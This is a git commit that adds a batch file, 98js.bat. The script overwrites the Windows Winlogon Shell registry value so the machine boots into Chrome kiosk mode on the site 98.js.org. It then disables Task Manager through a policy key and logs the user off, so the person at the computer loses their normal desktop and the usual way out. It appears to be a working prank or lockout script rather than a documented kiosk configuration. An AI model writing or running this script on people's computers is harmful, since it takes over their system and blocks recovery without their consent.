8590f39f724ef0eab2d33bc4a7c9b38927af60c9
Elijah R <62162399+elijahr2411@users.noreply.github.com>
2022-04-23 14:27:23 -0400

    Add files via upload

---
+++ 98js.bat
@@ -0,0 +1,5 @@
+@echo off
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "\"C:\Program Files\Google\Chrome\chrome.exe\" --kiosk https://98.js.org" /f
+REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /f
+REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
+logoff
